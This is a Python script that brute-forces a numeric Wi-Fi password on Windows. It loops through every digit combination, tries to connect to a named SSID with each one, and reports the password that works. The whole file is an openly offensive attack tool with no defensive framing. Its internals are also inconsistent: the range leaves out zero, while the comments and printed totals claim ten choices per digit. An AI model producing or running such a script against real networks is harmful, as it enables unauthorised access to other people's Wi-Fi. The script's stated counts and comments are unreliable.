import itertools
import time
from wifi_window_con import ssid
from wifi_window_con import connect_windows
from test import check_wifi_password_windows
from test import remove_leading_zeros_conversion as zero_trim

def crack_digi_pass(max_number, num_digits, sleep_time=0.01):
    number_range = range(1, max_number + 1)
    outcomes = itertools.product(number_range, repeat=num_digits) #(0-10),10
    total_choices_per_digit = max_number + 1
    
    total_outcomes = total_choices_per_digit ** num_digits 
    
    print(f"✨ Starting generation with {num_digits} digits (0-{max_number}).")
    # The calculated time will now be much shorter due to the reduced sleep_time.
    print(f"Total Outcomes: {total_outcomes} (10^10).")
    print(f"If fully executed, this would take approximately {total_outcomes * sleep_time / 3600 / 24:.2f} days.")
    print("-" * 40)
    
    # 3. Iterate through the generated outcomes and print, overwriting the line
    counter = 0
    for outcome in outcomes:
        outcome_str = "".join(map(str, outcome))
        #outcome_str = zero_trim(outcome_str)
        connect_windows(ssid,outcome_str)
        if(check_wifi_password_windows(ssid,outcome_str)):
            print(f"\n✅ The password is likely: {outcome_str}")
            break
        print(f"\rCurrent Outcome: {outcome_str}\n", end="", flush=True) 
        counter += 1
        time.sleep(sleep_time) 

    print() 
    print("-" * 40)
    print(f"✅ Finished! Outcomes generated: {counter} (Formula: {total_choices_per_digit}^{num_digits})")
    
crack_digi_pass(9,9)